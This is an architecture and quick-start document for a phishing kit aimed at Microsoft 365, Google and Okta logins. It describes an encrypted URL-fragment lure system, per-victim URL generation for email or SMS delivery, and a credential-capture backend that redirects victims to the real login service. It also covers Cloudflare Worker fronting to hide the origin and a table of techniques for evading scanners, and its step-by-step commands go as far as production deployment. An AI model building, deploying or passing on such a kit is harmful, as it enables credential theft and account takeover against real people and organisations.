# Azure Phishing Kit — Architecture

> Replicates the commercial PhaaS architecture analyzed in `docs/strasser-new-technique/`.

## Architecture

```
┌────────────────────────────────────────────────────────────┐
│ 1. KEY GENERATION                                         │
│    payload-generator/keygen.go                             │
│    → Generates AES-256 key                                 │
│    → Output: base64-encoded 32-byte key                   │
│    → Shared between payload-generator and landing page     │
└────────────────────────────────────────────────────────────┘
                         │
                         ▼
┌────────────────────────────────────────────────────────────┐
│ 2. PAYLOAD GENERATION                                     │
│    payload-generator/main.go                               │
│    → Takes: email, brand, template, redirect URL          │
│    → Builds JSON lure config                              │
│    → Encrypts with AES-256-GCM (random nonce per victim)  │
│    → Prepends "mv=" prefix                                │
│    → base64url encodes → fragment for URL #               │
└────────────────────────────────────────────────────────────┘
                         │
                         ▼
┌────────────────────────────────────────────────────────────┐
│ 3. URL ASSEMBLY                                           │
│    scripts/generate-url.sh                                 │
│    → https://{host}/?{victim-param}#{encrypted-fragment}  │
│    → Delivered via email/SMS to victim                    │
└────────────────────────────────────────────────────────────┘
                         │
                         ▼
┌────────────────────────────────────────────────────────────┐
│ 4. LANDING PAGE (CLIENT-SIDE)                             │
│    landing-page/index.html                                 │
│    → Reads window.location.hash (fragment)                │
│    → Strips "mv=" prefix                                  │
│    → Decrypts with AES-256-GCM (Web Crypto API)           │
│    → Parses JSON lure config                              │
│    → Renders branded phishing page (M365/Google/Okta)     │
│    → Captures credentials → POST /capture                 │
│    → Follows 302 redirect to real service                 │
└────────────────────────────────────────────────────────────┘
                         │
                         ▼
┌────────────────────────────────────────────────────────────┐
│ 5. CAPTURE BACKEND (SERVER-SIDE)                          │
│    capture-backend/main.go                                 │
│    → Receives POST /capture with creds                    │
│    → Encrypts captured data with storage key              │
│    → Logs to stdout (pipe to file/DB in production)       │
│    → Returns 302 redirect to real service                  │
└────────────────────────────────────────────────────────────┘
                         │
                         ▼
┌────────────────────────────────────────────────────────────┐
│ 6. CDN FRONTING (OPTIONAL)                                │
│    cdn-config/worker.js                                    │
│    → Cloudflare Worker reverse proxies to origin          │
│    → Victim sees: workers.dev (CF cert, CF IP)            │
│    → Origin IP: never exposed                              │
└────────────────────────────────────────────────────────────┘
```

## Detection Evasion Layers

| Layer | Technique | How |
|-------|-----------|-----|
| 1 | URL Fragment (`#`) | Payload never sent in HTTP — invisible to scanners |
| 2 | AES-256-GCM | Cryptographically opaque; no static signatures |
| 3 | CDN Fronting | Cloudflare/CF TLS cert; origin hidden |
| 4 | Victim-specific | Each URL unique (different nonce → different ciphertext) |
| 5 | Authenticated encryption | GCM tag prevents tampering; integrity verified |

## Key Management

- **Lure encryption key:** Embedded in `landing-page/index.html` (`AES_KEY_B64`)
- **Storage encryption key:** Set via `STORAGE_KEY` env var on capture-backend
- **Key rotation:** Regenerate with `keygen.go`, update both landing page and payload-generator

## Quick Start

```bash
# 1. Generate encryption key
cd payload-generator
go run keygen.go
# Output: <base64-key>

# 2. Embed key in landing page
# Edit landing-page/index.html, set AES_KEY_B64 = '<base64-key>'

# 3. Generate phishing URL
cd ../scripts
export AES_KEY='<base64-key>'
export PHISH_HOST='your-domain.com:9090'
./generate-url.sh --email victim@corp.com --brand microsoft

# 4. Start capture backend
cd ../capture-backend
STORAGE_KEY='<base64-key>' REDIRECT_URL='https://login.microsoftonline.com' go run main.go

# 5. Serve landing page (simple Python server for testing)
cd ../landing-page
python3 -m http.server 8081

# 6. (Production) Deploy CDN fronting
cd ../cdn-config
npx wrangler deploy
```

## File Layout

```
azure-phish-kit/
├── payload-generator/
│   ├── main.go          # Encrypt lure config → base64url fragment
│   ├── keygen.go        # Generate AES-256 key
│   └── go.mod
├── landing-page/
│   └── index.html       # Client-side decryptor + phishing page
├── capture-backend/
│   ├── main.go          # Credential receiver (encrypt + store + redirect)
│   └── go.mod
├── cdn-config/
│   ├── worker.js        # Cloudflare Worker reverse proxy
│   └── wrangler.toml    # Wrangler deploy config
├── scripts/
│   └── generate-url.sh  # URL generator script
└── docs/
    └── architecture.md  # This document
```
